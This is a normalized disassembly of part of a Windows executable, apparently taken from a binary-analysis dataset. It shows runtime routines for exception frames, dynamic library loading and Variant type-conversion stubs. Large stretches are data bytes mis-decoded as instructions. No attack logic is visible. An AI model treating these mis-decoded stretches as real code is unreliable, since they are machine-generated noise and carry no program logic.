retn
mov al 0x1
sub_40cfc4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40d03b
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_4058a8
mov ecx eax
mov edx r-xdata
mov eax ebx
call sub_403324
test al al
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d042
lea eax [ ebp - 0x4 ]
call sub_4058a8
retn
mov ecx edi
mov edx esi
mov eax ebx
call sub_403324
test al al
jne r-xdata
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40cfa0
test al al
jne r-xdata
mov al 0x1
sub_40d05c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
push edx
call SetErrorMode
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_40d0ce
push [ fs : eax ]
mov [ fs : eax ] esp
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_40d0b0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4044a8
push eax
call LoadLibraryA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d0b7
fnclex
fldcw [ ebp - 0x2 ]
retn
sub_40d0e0
sbb eax 0x4000000
xor eax [ edi ]
pop eax
movsb [ edi ] [ esi ]
inc edi
add ah bh
xor al [ edi ]
push 0xf40047a3
xor al [ edi ]
enter 0x47a1 0x0
in al dx
xor al [ edi ]
movsb [ edi ] [ esi ]
movsb [ edi ] [ esi ]
inc edi
add ah ah
xor al [ edi ]
fsub [ edi + eax * 2 + 0x4732dc00 ]
add [ eax - 0x2bffb85e ] dl
xor al [ edi ]
dec esp
mov [ 0x32cc0047 ] eax
inc edi
add [ eax - 0x3bffb85f ] dl
xor al [ edi ]
mov al [ 0xffffffffbc0047a3 ]
xor al [ edi ]
in al dx
mov [ 0x32b40047 ] eax
inc edi
add [ eax ] ah
mov [ 0x32ac0047 ] eax
inc edi
add [ eax ] ch
mov [ 0x32a40047 ] eax
inc edi
add [ ebp + 0x47 ] cl
add [ edx + esi - 0x5cdbffb9 ] bl
inc edi
add [ edx + esi - 0x5a2fffb9 ] dl
inc edi
add [ edx + esi - 0x5bd3ffb9 ] cl
inc edi
add [ edx + esi - 0x5bf7ffb9 ] al
inc edi
add [ edx + esi + 0x47 ] bh
add ah ah
movsd [ edi ] [ esi ]
inc edi
add [ edx + esi + 0x47 ] dh
add [ ebp + 0x326c0047 ] cl
inc edi
add [ eax ] bh
mov [ 0x32640047 ] eax
inc edi
add [ ebp + 0x47 ] dl
add [ edx + esi + 0x47 ] bl
add [ ebp + 0x47 ] ah
add [ edx + esi + 0x47 ] dl
add [ edx + 0x47 ] dh
add [ edx + esi + 0x47 ] cl
add [ eax ] dh
mov [ 0x32440047 ] al
inc edi
add [ esp ] al
inc edi
add [ edx + esi ] bh
inc edi
add [ esp + 0x32340047 ] bl
inc edi
add [ ecx + 0x322c0047 ] bl
inc edi
add [ eax - 0x5b ] cl
inc edi
add [ edx + esi ] ah
inc edi
add [ ebx ] dh
inc edi
add [ eax ] ch
add [ eax ] al
add [ edx + esi ] bl
inc edi
add [ 0x47 ] ch
add [ eax ] al
sbb [ edx ] dh
inc edi
add ah dl
mov eax [ 0x47 ]
add [ eax ] al
adc al 0x32
inc edi
add [ eax + 0x47a4 ] dl
add [ eax ] al
add [ eax ] dl
xor al [ edi ]
test al 0xa1
inc edi
add [ eax ] al
add [ eax ] al
add [ edx + esi ] cl
inc edi
add [ edx + 0x47 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] cl
xor al [ edi ]
inc esp
mov [ 0x47 ] al
add [ eax ] al
add al 0x32
inc edi
add ah ch
mov eax [ 0x47 ]
add [ eax ] al
add [ edx ] dh
inc edi
add [ eax ] dh
mov [ 0x47 ] eax
add [ eax ] al
cld
xor [ edi ] eax
sub [ edi + eax * 2 ] ah
add al bh
xor [ edi ] eax
dec eax
mov [ 0x47 ] al
add [ eax ] al
hlt
sub_40d530
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40d598
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d59f
retn
mov eax sub_40d0e0
call sub_403d94
mov eax r-xdata
call sub_403dbc
cmp [ rw-data ] 0x0
je r-xdata
call sub_40bd6c
call sub_40be70
call sub_40cb1c
call sub_40c6b4
mov eax rw-data
mov edx r-xdata
call sub_40403c
sub_40d5d0
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
mov ax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call VariantChangeType
mov eax 0x80004001
jmp r-xdata
pop ebp
retn 0x14
sub_40d624
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d67e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404270
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40823c
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d685
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
sub_40d690
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d6ea
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404270
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40957c
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d6f1
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
sub_40d6fc
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d756
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404270
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409550
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d75d
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
sub_40d768
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d7c2
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404270
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40adc8
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d7c9
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
sub_40d7d4
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d82e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404270
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_4095a8
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d835
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
sub_40d840
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_40d8ad
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_404270
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
call sub_408348
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
cmp [ ebp - 0x1 ] 0x1
cmc
sbb eax eax
mov edx [ ebp + 0x14 ]
mov [ edx ] ax
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d8b4
lea eax [ ebp - 0x8 ]
call sub_403fe8
retn
sub_40d8c0
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40d920
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_409504
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_404814
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d927
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
sub_40d930
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40d990
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_40a554
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_404814
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d997
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
sub_40d9a0
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40da04
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
cmp [ ebp + 0x8 ] 0x1
sbb eax eax
inc eax
lea ecx [ ebp - 0x4 ]
xor edx edx
call sub_4083e4
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x14 ]
call sub_404814
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40da0b
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
sub_40da34
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx ebx
mov ecx [ ebp + 0x8 ]
cmp [ ecx - 0x4 ] 0x0
je r-xdata
mov eax edx
pop ebx
pop ebp
retn
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
call GetProcAddress
mov edx eax
test edx edx
jne r-xdata
mov edx ebx
sub_40da60
push ebp
mov ebp esp
push ecx
push r-xdata
call GetModuleHandleA
mov [ ebp - 0x4 ] eax
push ebp
mov edx sub_40d5d0
mov eax r-xdata
call sub_40da34
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d600
mov eax r-xdata
call sub_40da34
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d600
mov eax r-xdata
call sub_40da34
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d60c
mov eax r-xdata
call sub_40da34
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d60c
mov eax r-xdata
call sub_40da34
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d60c
mov eax r-xdata
call sub_40da34
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d60c
mov eax r-xdata
call sub_40da34
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d60c
mov eax r-xdata
call sub_40da34
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d60c
mov eax r-xdata
call sub_40da34
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d60c
mov eax r-xdata
call sub_40da34
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d60c
mov eax r-xdata
call sub_40da34
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d60c
mov eax r-xdata
call sub_40da34
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d618
mov eax r-xdata
call sub_40da34
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d624
mov eax r-xdata
call sub_40da34
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d690
mov eax r-xdata
call sub_40da34
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d6fc
mov eax r-xdata
call sub_40da34
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d768
mov eax r-xdata
call sub_40da34
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d7d4
mov eax r-xdata
call sub_40da34
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d840
mov eax r-xdata
call sub_40da34
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d8c0
mov eax r-xdata
call sub_40da34
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d930
mov eax r-xdata
call sub_40da34
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d9a0
mov eax r-xdata
call sub_40da34
pop ecx
mov [ rw-data ] eax
pop ecx
pop ebp
retn
sub_40dd6c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40dd91
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dd98
retn
sub_40decc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0xdf
jo r-xdata
popad
outsb
je r-xdata
insb
outsd
ja r-xdata
inc ebx
popad
jae r-xdata
add [ eax + 0x8004034 ] ch
xor al [ eax ]
and al 0x32
inc eax
add [ eax + 0x32 ] ah
inc eax
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x70795474
outsb
jbe r-xdata
add [ eax ] cl
jb r-xdata
xor al [ eax ]
and al 0x32
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x20 ] al
inc eax
inc ebp
jb r-xdata
jns r-xdata
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x6f727245
push esi
popad
jb r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
loopne r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
loopne r-xdata
outsd
jb r-xdata
inc eax
loopne r-xdata
inc ebx
popad
jb r-xdata
js r-xdata
adc eax 0x72615645
jns r-xdata
add [ eax + 0x8004034 ] ch
xor al [ eax ]
and al 0x32
outsb
jbe r-xdata
jb r-xdata
add [ eax + eax ] cl
popad
outsb
je r-xdata
rol [ eax - 0x20 ] 0x40
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
xor [ ecx + 0x40 ] bh
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax + 0x8004034 ] ch
rcr ah 0xdf
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ eax + 0x32 ] ah
inc eax
add [ edi ] dl
inc ebp
push esi
popad
jb r-xdata
add [ edx + esi ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
popad
outsb
je r-xdata
inc ebp
push esi
popad
jb r-xdata
xor al [ eax ]
pushad
xor al [ eax ]
push ss
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x21 ] bh
add [ eax ] cl
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
outsb
js r-xdata
dec ecx
popad
outsb
je r-xdata
popad
insb
imul esp [ ecx + eax * 2 + 0x72 ] 0x72724567
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
loope r-xdata
loope r-xdata
inc eax
add [ eax + 0x32 ] ah
inc eax
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x65764f74
jb r-xdata
loopne r-xdata
inc ecx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
fild [ eax ]
or al 0x0
add [ eax ] al
xor [ ecx + 0x40 ] bh
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax + 0x8004034 ] ch
xor al [ eax ]
and al 0x32
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
inc eax
add [ eax + eax ] cl
add [ eax ] al
xor [ ecx + 0x40 ] bh
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax + 0x8004034 ] ch
xor al [ eax ]
and al 0x32
inc eax
add [ eax + 0x32 ] ah
inc eax
add [ esi ] dl
add [ eax ] al
lea eax [ eax ]
adc al 0xdf
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebx * 8 ] dl
outsb
je r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0xe1
inc eax
outsd
jb r-xdata
outsd
jb r-xdata
xor al [ eax ]
and al 0x32
inc eax
add [ eax + 0x32 ] ah
inc eax
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
xor [ ecx + 0x40 ] bh
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax + 0x8004034 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
loope r-xdata
outsd
imul esp [ ecx + 0x6e ] 0x64614274
dec ecx
mov al 0x34
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add [ eax ] cl
shr [ ecx + 0x40 ] 0x0
add [ eax ] al
xor al [ eax ]
and al 0x32
add [ eax + eax ] cl
add [ eax ] al
xor [ ecx + 0x40 ] bh
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax + 0x8004034 ] ch
inc eax
add [ eax + 0x32 ] ah
inc eax
add [ 0x72615645 ] dl
add [ edx + esi ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ eax + 0x32 ] ah
inc eax
add [ edi ] dl
inc ebp
push esi
popad
jb r-xdata
add [ edx + esi ] ah
add [ eax ] al
xor [ ecx + 0x40 ] bh
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0040 ] ah
inc ebp
jb r-xdata
fild [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ eax + eax ] cl
add [ eax ] al
xor [ ecx + 0x40 ] bh
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ esp + esi + 0x34b00040 ] ch
jb r-xdata
xor al [ eax ]
and al 0x32
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
jb r-xdata
outsb
je r-xdata
popad
inc eax
add ah dl
loope r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or cl ah
inc eax
outsd
or [ edx ] dh
inc eax
add [ edx + esi ] ah
outsd
inc eax
add [ eax + 0x40e2 ] ah
add [ eax ] al
popad
jb r-xdata
popad
jns r-xdata
inc eax
add [ eax + 0x32 ] ah
inc eax
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
add [ edx + esi ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
loope r-xdata
outsb
je r-xdata
popad
outsb
je r-xdata
inc eax
add [ eax + 0x32 ] ah
inc eax
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
inc eax
add [ eax ] cl
insd
add [ eax ] al
xor al [ eax ]
and al 0x32
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax + 0x8004034 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add [ eax ] cl
jb r-xdata
add [ eax ] al
jb r-xdata
add [ eax ] cl
outsd
arpl [ ebx + 0x65 ] bp
inc ebp
jb r-xdata
outsd
add [ eax + eax ] cl
add [ eax ] al
xor [ ecx + 0x40 ] bh
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax + 0x8004034 ] ch
add [ eax + 0x32 ] ah
inc eax
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x73694474
jo r-xdata
outsb
js r-xdata
xor al 0x40
add [ eax ] cl
jne r-xdata
jb r-xdata
inc ebp
jb r-xdata
xor al [ eax ]
and al 0x32
add [ eax + eax ] cl
add [ eax ] al
xor [ ecx + 0x40 ] bh
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax + 0x8004034 ] ch
jo r-xdata
popad
je r-xdata
xor al [ eax ]
and al 0x32
inc eax
add [ eax + 0x32 ] ah
inc eax
add [ eax * 2 + 0x69726156 ] dl
inc eax
add [ edx ] bh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] bh
inc eax
add [ eax + eax ] cl
add [ eax ] al
xor [ ecx + 0x40 ] bh
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax + 0x8004034 ] ch
jbe r-xdata
je r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
arpl [ gs : ebp + 0x64 ] si
inc ebp
jb r-xdata
jae r-xdata
popad
insb
dec edi
dec bp
insd
outsd
jb r-xdata
je r-xdata
inc eax
add [ eax ] cl
jecxz r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
jecxz r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
jecxz r-xdata
jecxz r-xdata
jb r-xdata
inc ebp
jb r-xdata
pop ebp
insb
imul esp [ esi + ecx * 2 + 0x75 ] 0x704f6c6c
inc ebp
dec esi
jne r-xdata
push 0x6f727245
jb r-xdata
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
enter 0x40de 0x0
mov al [ 0xffffffffac004034 ]
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax + 0x8004034 ] ch
xor al [ eax ]
and al 0x32
inc eax
add [ eax + 0x32 ] ah
inc eax
add [ edx ] bl
inc ebp
push esi
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shl bl 0x1
inc eax
outsd
outsd
jb r-xdata
popad
add [ edx + esi ] ah
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x40 ] ch
add [ eax + eax ] cl
add [ eax ] al
xor [ ecx + 0x40 ] bh
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax + 0x8004034 ] ch
xor al [ eax ]
and al 0x32
inc ebp
jb r-xdata
inc eax
add [ eax + 0x32 ] ah
inc eax
add [ edi ] dl
inc ebp
push esi
popad
jb r-xdata
add [ edx + esi ] ah
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0040e2 ] ah
add [ eax ] al
add [ eax ] dh
jns r-xdata
iretd
call 0xffffffff8c2531dd
mov ebx eax
xor eax eax
push ebp
push sub_40e4cf
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_413bbc
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_413bbc
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405d6c
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a4
call sub_403a24
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e4d6
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_40400c
retn
insb
dec edi
jo r-xdata
rcl al 0xe3
retn
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
outsd
popad
jns r-xdata
add [ ebp - 0x4c1703bb ] cl
pop ebx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e43d
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
outsb
sub_40e3ec
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e436
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d6c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_403a24
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e43d
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
sub_40e440
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
